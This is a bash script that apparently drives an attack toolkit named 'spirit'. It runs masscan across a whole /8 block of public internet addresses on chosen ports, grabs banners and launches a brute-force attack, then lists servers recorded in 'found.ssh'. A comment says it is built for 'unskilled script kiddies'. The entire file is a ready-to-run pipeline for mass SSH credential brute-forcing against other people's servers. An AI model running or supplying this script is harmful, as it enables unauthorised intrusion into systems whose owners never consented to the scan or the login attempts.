#!/bin/bash
set -e

# Designed for unskilled script kiddies and the sort...

if [ $# != 3 ]; then
    echo -e "[-] \e[31mUsage example: $0 <class-A> <port1,port2,port3> <speed> \e[0m"
    exit
fi
clear

if [[ ! -e $(which masscan) ]]; then
    printf "Installing masscan...\n"
    apt install masscan || printf "You have to install masscan\n"
fi

echo -e "[+] increasing system limits"
ulimit -n 65535

echo -e "[+] starting masscan on network [$1.0.0.0/8] port [$2] with speed [$3]"
sudo ./masscan \
--range "$1".0.0.0-"$1".255.255.255 \
--ports "$2" \
--max-rate "$3" \
--exclude 255.255.255.255 \
--exclude 10.0.0.0/8 \
--exclude 192.168.0.0/16 \
--exclude 127.0.0.0/8 \
--interactive \
-oG open.lst

HOSTS=$(wc -l < open.lst) &>/dev/null
echo -e "[+] masscan found [$HOSTS] hosts on port/s [$2]"

echo -e "[+] parsing masscan output"
./spirit parse

echo -e "[+] starting banner grabber"
./spirit banner

cat <h.lst|sort|uniq|shuf>hh.lst
mv hh.lst h.lst

echo -e "[+] starting brute-force attack"
./spirit brute

echo -e "[+] done, let's see what we've found:"
sleep 3
head -n20 found.ssh || echo "no servers found :("
